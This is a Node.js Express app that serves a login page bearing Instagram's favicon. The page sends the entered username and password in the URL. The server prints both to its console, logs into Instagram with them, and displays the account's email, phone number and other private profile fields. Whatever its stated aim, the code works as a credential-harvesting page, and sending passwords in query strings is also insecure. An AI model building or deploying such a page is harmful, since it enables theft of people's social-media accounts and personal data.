const Instagram = require('instagram-web-api')
const express = require('express')
const app = express()

app.get('/', (req, res) => {

  let body = `
    <style>
      html {
        height: 100%;
      }
      body {
        margin:0;
        padding:0;
        font-family: sans-serif;
        background: linear-gradient(#141e30, #243b55);
      }
      
      .login-box {
        position: absolute;
        top: 50%;
        left: 50%;
        width: 400px;
        padding: 40px;
        transform: translate(-50%, -50%);
        background: rgba(0,0,0,.5);
        box-sizing: border-box;
        box-shadow: 0 15px 25px rgba(0,0,0,.6);
        border-radius: 10px;
      }
      
      .login-box h2 {
        margin: 0 0 30px;
        padding: 0;
        color: #fff;
        text-align: center;
      }
      
      .login-box .user-box {
        position: relative;
      }
      
      .login-box .user-box input {
        width: 100%;
        padding: 10px 0;
        font-size: 16px;
        color: #fff;
        margin-bottom: 30px;
        border: none;
        border-bottom: 1px solid #fff;
        outline: none;
        background: transparent;
      }
      .login-box .user-box label {
        position: absolute;
        top:0;
        left: 0;
        padding: 10px 0;
        font-size: 16px;
        color: #fff;
        pointer-events: none;
        transition: .5s;
      }
      
      .login-box .user-box input:focus ~ label,
      .login-box .user-box input:valid ~ label {
        top: -20px;
        left: 0;
        color: #03e9f4;
        font-size: 12px;
      }
      
      .login-box form a {
        position: relative;
        display: inline-block;
        padding: 10px 20px;
        color: #03e9f4;
        font-size: 16px;
        text-decoration: none;
        text-transform: uppercase;
        overflow: hidden;
        transition: .5s;
        margin-top: 40px;
        letter-spacing: 4px
      }
      
      .login-box a:hover {
        background: #03e9f4;
        color: #fff;
        cursor: pointer;
        border-radius: 5px;
        box-shadow: 0 0 5px #03e9f4,
                    0 0 25px #03e9f4,
                    0 0 50px #03e9f4,
                    0 0 100px #03e9f4;
      }
      
      .login-box a span {
        position: absolute;
        display: block;
      }
      
      .login-box a span:nth-child(1) {
        top: 0;
        left: -100%;
        width: 100%;
        height: 2px;
        background: linear-gradient(90deg, transparent, #03e9f4);
        animation: btn-anim1 1s linear infinite;
      }
      
      @keyframes btn-anim1 {
        0% {
          left: -100%;
        }
        50%,100% {
          left: 100%;
        }
      }
      
      .login-box a span:nth-child(2) {
        top: -100%;
        right: 0;
        width: 2px;
        height: 100%;
        background: linear-gradient(180deg, transparent, #03e9f4);
        animation: btn-anim2 1s linear infinite;
        animation-delay: .25s
      }
      
      @keyframes btn-anim2 {
        0% {
          top: -100%;
        }
        50%,100% {
          top: 100%;
        }
      }
      
      .login-box a span:nth-child(3) {
        bottom: 0;
        right: -100%;
        width: 100%;
        height: 2px;
        background: linear-gradient(270deg, transparent, #03e9f4);
        animation: btn-anim3 1s linear infinite;
        animation-delay: .5s
      }
      
      @keyframes btn-anim3 {
        0% {
          right: -100%;
        }
        50%,100% {
          right: 100%;
        }
      }
      
      .login-box a span:nth-child(4) {
        bottom: -100%;
        left: 0;
        width: 2px;
        height: 100%;
        background: linear-gradient(360deg, transparent, #03e9f4);
        animation: btn-anim4 1s linear infinite;
        animation-delay: .75s
      }
      
      @keyframes btn-anim4 {
        0% {
          bottom: -100%;
        }
        50%,100% {
          bottom: 100%;
        }
      }    
    </style>
<link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
    <div class="login-box">
      <h2>Login</h2>
      <form>
        <div class="user-box">
          <input type="text" name="" id="name" required="">
          <label>Username</label>
        </div>
        <div class="user-box">
          <input type="password" id="senha" name="" required="">
          <label>Password</label>
        </div>
        <a id="btn">
          <span></span>
          <span></span>
          <span></span>
          <span></span>
          Submit
        </a>
      </form>
    </div>
    <script>
      document.getElementById('btn').addEventListener('click', () => {
        const name = document.getElementById('name').value
        const senha = document.getElementById('senha').value
    
        window.location.href = '/result/'+name+'?senha='+senha
      })
    </script>
  `

  res.send(body)
})

app.get('/result/:name', async (req, res) => {
  const username = await req.params.name
  const password = await req.query.senha

  console.log(username)
  console.log(password)

  const client = await new Instagram({ username, password })
 
  client
    .login()
    .then(() => {
      client
        .getProfile()
        .then(e => {
          console.log(e)
          res.send(`
          <style>
            html {
              height: 100%;
            }
            body {
              margin:0;
              padding:0;
              font-family: sans-serif;
              background: linear-gradient(#141e30, #243b55);
            }
      
            .login-box {
              position: absolute;
              top: 50%;
              left: 50%;
              width: 400px;
              padding: 40px;
              transform: translate(-50%, -50%);
              background: rgba(0,0,0,.5);
              box-sizing: border-box;
              box-shadow: 0 15px 25px rgba(0,0,0,.6);
              border-radius: 10px;
            }
            
            .login-box h2 {
              margin: 0 0 30px;
              padding: 0;
              color: #fff;
              text-align: center;
            }
          </style>
          
<link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">

          <div class="login-box">
            <title>${e.username}</title>
            <h2>Name: <span>${e.first_name}</span></h2>
            <h2>Nome de usuario: <span>${e.username}</span></h2>
            <h2>Email: <span>${e.email}</span></h2>
            <h2>Telefone: <span>${e.phone_number}</span></h2>
            <h2>Sexo: <span>${e.gender == 1 ? 'Masculino' : 'Feminino'}</span></h2>
            <h2>Bio: <span>${e.biography}</h2>
            <h2>Nome de usuario passado: <span>${e.trusted_username}</span></h2>
          </div>
        `)
        })
    })
})

// 


app.listen(process.env.PORT || 8080)
